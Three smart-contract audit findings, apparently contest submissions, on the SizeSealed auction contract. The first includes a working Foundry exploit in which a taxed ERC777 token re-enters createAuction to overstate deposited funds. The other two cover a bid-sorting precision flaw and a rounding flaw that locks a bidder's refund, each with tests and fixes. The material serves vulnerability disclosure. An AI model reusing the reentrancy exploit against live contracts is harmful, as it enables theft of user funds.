# Lines of code  https://github.com/code-423n4/2022-11-size/blob/main/src/SizeSealed.sol#L96-L102   # Vulnerability details  ## Impact The createAuction function lacks the check of re-entrancy. An attacker can use an ERC777 token with tax as the base token to create auctions. By registering ERC777TokensSender interface implementer in the ERC1820Registry contract, the attacker can re-enter the createAuction function and create more than one auction with less token. And the sum of the totalBaseAmount of these auctions will be greater than the token amount received by the SizeSealed contract. Finally, the attacker can take more money from the contract global pool which means stealing tokens from the other auctions and treasury.  ## Proof of Concept Forge test  ``` // SPDX-License-Identifier: GPL-3.0 pragma solidity 0.8.17;  import {Test} from "forge-std/Test.sol";  import {SizeSealedTest} from "./SizeSealed.t.sol"; import {ERC777} from "openzeppelin-contracts/contracts/token/ERC777/ERC777.sol"; import "openzeppelin-contracts/contracts/utils/introspection/IERC1820Registry.sol"; import {MockSeller} from "./mocks/MockSeller.sol"; import {MockERC20} from "./mocks/MockERC20.sol";  contract TaxERC777 is ERC777{     uint32 tax = 50; // 50% tax rate      constructor(string memory name_,         string memory symbol_,         address[] memory defaultOperators_) ERC777(name_, symbol_, defaultOperators_){}          function mint(address rec, uint256 amount) external{         super._mint(rec, amount, "", "", false);     }      function _beforeTokenTransfer(         address operator,         address from,         address to,         uint256 amount     ) internal override {         if(to == address(0)||from==address(0)){ return;}         // tax just burn for test              }      function _send(         address from,         address to,         uint256 amount,         bytes memory userData,         bytes memory operatorData,         bool requireReceptionAck     ) internal override {         uint tax_amount = amount* tax / 100;         _burn(from, tax_amount, "", "");         super._send(from, to, amount-tax_amount, userData, operatorData, requireReceptionAck);     }  }  contract Callback {     MockSeller seller;     uint128 baseToSell;      uint256 reserveQuotePerBase = 0.5e6 * uint256(type(uint128).max) / 1e18;     uint128 minimumBidQuote = 1e6;     // Auction parameters (cliff unlock)     uint32 startTime;     uint32 endTime;     uint32 unlockTime;     uint32 unlockEnd;     uint128 cliffPercent;      uint8 entry = 0;     uint128 amount_cut_tax;     constructor(MockSeller _seller, uint128 _baseToSell, uint256 _reserveQuotePerBase, uint128 _minimumBidQuote, uint32 _startTime, uint32 _endTime, uint32 _unlockTime, uint32 _unlockEnd, uint128 _cliffPercent){         seller = _seller;         baseToSell = _baseToSell;         reserveQuotePerBase = _reserveQuotePerBase;         minimumBidQuote = _minimumBidQuote;         startTime = _startTime;         endTime = _endTime;         unlockTime = _unlockTime;         unlockEnd = _unlockEnd;         cliffPercent = _cliffPercent;     }     function tokensToSend(address operator, address from, address to, uint256 amount, bytes calldata userData, bytes calldata operatorData) external{         if(from==address(0) || to==address(0)){return;}         if(entry == 0){             entry += 1;             amount_cut_tax = baseToSell / 2;             seller.createAuction(                 amount_cut_tax, reserveQuotePerBase, minimumBidQuote, startTime, endTime, unlockTime, unlockEnd, cliffPercent             );             return;         }         else if(entry == 1){             entry += 1;             ERC777(msg.sender).transferFrom(from, to, amount_cut_tax);             return;         }         entry += 1;         return;              }     function canImplementInterfaceForAddress(bytes32 interfaceHash, address addr) external view returns(bytes32){return keccak256(abi.encodePacked("ERC1820_ACCEPT_MAGIC"));} }  contract MyTest is SizeSealedTest {          IERC1820Registry internal constant _ERC1820_REGISTRY = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);     function testCreateAuctionFromErc777() public {         TaxERC777 tax777Token;         address[] memory addrme = new address[](1);         addrme[0] = address(this);         tax777Token = new TaxERC777("t7", "t7", addrme);                  seller = new MockSeller(address(auction), quoteToken, MockERC20(address(tax777Token)));         Callback callbackImpl = new Callback(seller, baseToSell, reserveQuotePerBase, minimumBidQuote, startTime, endTime, unlockTime, unlockEnd, cliffPercent);          // just without adding more function to MockSeller         vm.startPrank(address(seller));         _ERC1820_REGISTRY.setInterfaceImplementer(address(seller), keccak256("ERC777TokensSender"), address(callbackImpl));         tax777Token.approve(address(callbackImpl), type(uint256).max);         vm.stopPrank();         seller.createAuction(             baseToSell, reserveQuotePerBase, minimumBidQuote, startTime, endTime, unlockTime, unlockEnd, cliffPercent         );         uint auction_balance = tax777Token.balanceOf(address(auction));         uint128 auction1_amount = get_auction_base_amount(1);         uint128 auction2_amount = get_auction_base_amount(2);         emit log_named_uint("auction balance", auction_balance);         emit log_named_uint("auction 1 totalBaseAmount", auction1_amount);         emit log_named_uint("auction 2 totalBaseAmount", auction2_amount);         assertGt(auction1_amount+auction2_amount, auction_balance);     }      function get_auction_base_amount(uint id) private returns (uint128){         (, ,AuctionParameters memory para) = auction.idToAuction(id);         return para.totalBaseAmount;     } } ```  You should fork mainnet because the test needs to call the ERC1820Registry contract at `0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24` ``` forge test --match-test testCreateAuctionFromErc777 -vvvvv --fork-url XXXXXXXX ```  Test passed and print logs: ``` ... ...     ├─ [4900] SizeSealed::idToAuction(1) [staticcall]     │   └─ ← (1657269193, 1657269253, 1657269293, 1657270193, 0), (0xbfFb01bB2DDb4EfA87cB78EeCB8115AFAe6d2032, 0, 340282366920938463463374607431768211455, 0), (0x3A1148FE01e3c4721D93fe8A36c2b5C29109B6ae, 0xCe71065D4017F316EC606Fe4422e11eB2c47c246, 170141183460469231731687303, 10000000000000000000, 1000000, 0x0000000000000000000000000000000000000000000000000000000000000000, (9128267825790407824510503980134927506541852140766882823704734293547670668960, 16146712025506556794526643103432719420453319699545331060391615514163464043902))     ├─ [4900] SizeSealed::idToAuction(2) [staticcall]     │   └─ ← (1657269193, 1657269253, 1657269293, 1657270193, 0), (0xbfFb01bB2DDb4EfA87cB78EeCB8115AFAe6d2032, 0, 340282366920938463463374607431768211455, 0), (0x3A1148FE01e3c4721D93fe8A36c2b5C29109B6ae, 0xCe71065D4017F316EC606Fe4422e11eB2c47c246, 170141183460469231731687303, 5000000000000000000, 1000000, 0x0000000000000000000000000000000000000000000000000000000000000000, (9128267825790407824510503980134927506541852140766882823704734293547670668960, 16146712025506556794526643103432719420453319699545331060391615514163464043902))     ├─ emit log_named_uint(key: auction balance, val: 10000000000000000000)     ├─ emit log_named_uint(key: auction 1 totalBaseAmount, val: 10000000000000000000)     ├─ emit log_named_uint(key: auction 2 totalBaseAmount, val: 5000000000000000000)     └─ ← ()  Test result: ok. 1 passed; 0 failed; finished in 7.64s ```  ## Tools Used  foundry  ## Recommended Mitigation Steps check re-entrancy
# Lines of code  https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L269-L277   # Vulnerability details  ## Impact When the seller finalizes his auction, all bids are sorted according to the `quotePerBase` and it's calculated using the `FixedPointMathLib.mulDivDown()`.  And the earliest bid will be used first for the same `quotePerBase` but this ratio is not strict enough so that the worse bid might be filled than the better one.  As a result, the seller might receive fewer quote token than he wants.  ## Proof of Concept This is the test to show the scenario.  ```solidity     function testAuditWrongSorting() public {         // this test will show that it is possible the seller can not claim the best bid because of the inaccurate comparison in finalization         uint128 K = 1<<64;         baseToSell = K + 2;         uint256 aid = seller.createAuction(             baseToSell, reserveQuotePerBase, minimumBidQuote, startTime, endTime, unlockTime, unlockEnd, cliffPercent         );          bidder1.setAuctionId(aid);         bidder1.bidOnAuctionWithSalt(K+1, K, "Worse bidder");         bidder2.setAuctionId(aid);         bidder2.bidOnAuctionWithSalt(K+2, K+1, "Better bidder"); // This is the better bid because (K+1)/(K+2) > K/(K+1)          vm.warp(endTime);          uint256[] memory bidIndices = new uint[](2);         bidIndices[0] = 1; // the seller is smart enough to choose the correct order to (1, 0)         bidIndices[1] = 0;          vm.expectRevert(ISizeSealed.InvalidSorting.selector);         seller.finalize(bidIndices, K+2, K+1); // this reverts because of #273          // next the seller is forced to call the finalize with parameter K+1, K preferring the first bidder         bidIndices[0] = 0;         bidIndices[1] = 1;         seller.finalize(bidIndices, K+1, K);          // at this point the seller gets K quote tokens while he could get K+1 quote tokens with the better bidder         assertEq(quoteToken.balanceOf(address(seller)), K);     } ```  This is the output of the test.  ```solidity     Running 1 test for src/test/SizeSealed.t.sol:SizeSealedTest     [PASS] testAuditWrongSorting() (gas: 984991)     Test result: ok. 1 passed; 0 failed; finished in 7.22ms ```  When it calculates the [quotePerBase](https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L269), they are same each other with `(base, quote) = (K+1, K) and (K+2, K+1) when K = 1<<64`.  So the seller can receive `K+1` of the quote token but he got `K`.  I think `K` is realistic enough with the 18 decimals token because K is around 18 * 1e18.  ## Tools Used Foundry  ## Recommended Mitigation Steps As we can see from the test, it's not strict enough to compare bidders using `quotePerBase`.  We can compare them by multiplying them like below.  $\frac {quote1}{base1} >= \frac{quote2}{base2} <=> quote1 * base2 >= quote2 * base1 $  So we can add 2 elements to `FinalizeData` struct and modify [this comparison](https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L269-L277) like below.  ```solidity     struct FinalizeData {         uint256 reserveQuotePerBase;         uint128 totalBaseAmount;         uint128 filledBase;         uint256 previousQuotePerBase;         uint256 previousIndex;         uint128 previousQuote; //++++++++++++         uint128 previousBase; //+++++++++++     } ```  ```solidity     uint256 quotePerBase = FixedPointMathLib.mulDivDown(b.quoteAmount, type(uint128).max, baseAmount);     if (quotePerBase >= data.previousQuotePerBase) {         // If last bid was the same price, make sure we filled the earliest bid first         if (quotePerBase == data.previousQuotePerBase) {             uint256 currentMult = uint256(b.quoteAmount) * data.previousBase; //mult for current bid             uint256 previousMult = uint256(data.previousQuote) * baseAmount; //mult for the previous bid              if (currentMult > previousMult) { // current bid is better                 revert InvalidSorting();                 }              if (currentMult == previousMult && data.previousIndex > bidIndex) revert InvalidSorting();         } else {             revert InvalidSorting();         }     }      ...      data.previousBase = baseAmount;     data.previousQuote = b.quoteAmount; ```
# Lines of code  https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L325   # Vulnerability details  ## Impact Bidders might fail to withdraw their unused funds after the auction was finalized because the contract doesn't have enough balance.  The main flaw is the seller might receive more quote tokens than the bidders offer after the auction was finalized.  If there is no other auctions to use the same quote token, the last bidder will fail to withdraw his funds because the contract doesn't have enough balance of quote token.  ## Proof of Concept After the auction was finalized, the seller receives the `filledQuote` amount of quote token using [data.filledBase](https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L325).  ```solidity     // Calculate quote amount based on clearing price     uint256 filledQuote = FixedPointMathLib.mulDivDown(clearingQuote, data.filledBase, clearingBase); ```  But when the bidders withdraw the funds using `withdraw()`, they offer the quote token [using this formula](https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L375-L382).  ```solidity     // Refund unfilled quoteAmount on first withdraw     if (b.quoteAmount != 0) {         uint256 quoteBought = FixedPointMathLib.mulDivDown(baseAmount, a.data.lowestQuote, a.data.lowestBase);         uint256 refundedQuote = b.quoteAmount - quoteBought;         b.quoteAmount = 0;          SafeTransferLib.safeTransfer(ERC20(a.params.quoteToken), msg.sender, refundedQuote);     } ```  Even if they use the same clearing price, the total amount of quote token that the bidders offer might be less than the amount that the seller charged during finalization because the round down would happen several times with the bidders.  This is the test to show the scenario.  ```solidity     function testAuditBidderMoneyLock() public {         // in this scenario, we show that bidder's money can be locked due to inaccurate calculation of claimed quote tokens for a seller         uint128 K = 1 ether;         baseToSell = 4*K;         uint256 aid = seller.createAuction(             baseToSell, reserveQuotePerBase, minimumBidQuote, startTime, endTime, unlockTime, unlockEnd, cliffPercent         );          bidder1.setAuctionId(aid);         bidder1.bidOnAuctionWithSalt(3*K, 3*K+2, "Honest bidder");         bidder2.setAuctionId(aid);         bidder2.bidOnAuctionWithSalt(2*K, 2*K+1, "Honest bidder");          vm.warp(endTime);          uint256[] memory bidIndices = new uint[](2);         bidIndices[0] = 0;         bidIndices[1] = 1;          seller.finalize(bidIndices, 2*K, 2*K+1);         emit log_string("Seller claimed");         // seller claimed 4*K+2         assertEq(quoteToken.balanceOf(address(seller)), 4*K+2);         // contract has K+1 quote token left         assertEq(quoteToken.balanceOf(address(auction)), K+1);          // bidder1 withdraws         bidder1.withdraw();         emit log_string("Bidder 1 withdrew");         // contract has K quote token left         assertEq(quoteToken.balanceOf(address(auction)), K);         // bidder2 withdraws and he is supposed to be able to claim K+1 quote tokens         // but the protocol reverts because of insufficient quote tokens         bidder2.withdraw();         emit log_string("Bidder 2 withdrew"); // will not happen     } ```  The test result shows the seller charged more quote token than the bidders offer so the last bidder can't withdraw his unused quote token because the contract doesn't have enough balance.  ```solidity     Running 1 test for src/test/SizeSealed.t.sol:SizeSealedTest     [FAIL. Reason: TRANSFER_FAILED] testAuditBidderMoneyLock() (gas: 954985)     Logs:     Seller claimed     Bidder 1 withdrew      Test result: FAILED. 0 passed; 1 failed; finished in 6.94ms      Failing tests:     Encountered 1 failing test in src/test/SizeSealed.t.sol:SizeSealedTest     [FAIL. Reason: TRANSFER_FAILED] testAuditBidderMoneyLock() (gas: 954985) ```  ## Tools Used Foundry  ## Recommended Mitigation Steps Currently, the `FinalizeData` struct contains the `filledBase` only and calculates the `filledQuote` using the clearing price.  ```solidity     struct FinalizeData {         uint256 reserveQuotePerBase;         uint128 totalBaseAmount;         uint128 filledBase;         uint256 previousQuotePerBase;         uint256 previousIndex;     } ```  I think we should add one more field `filledQuote` and update it during auction finalization.  And the seller can recieve the sum of `filledQuote` of all bidders to avoid the rounding issue.  Also, each bidder can pay the `filledQuote` of quote token and receive the `filledBase` of base token without calculating again using the clearing price.
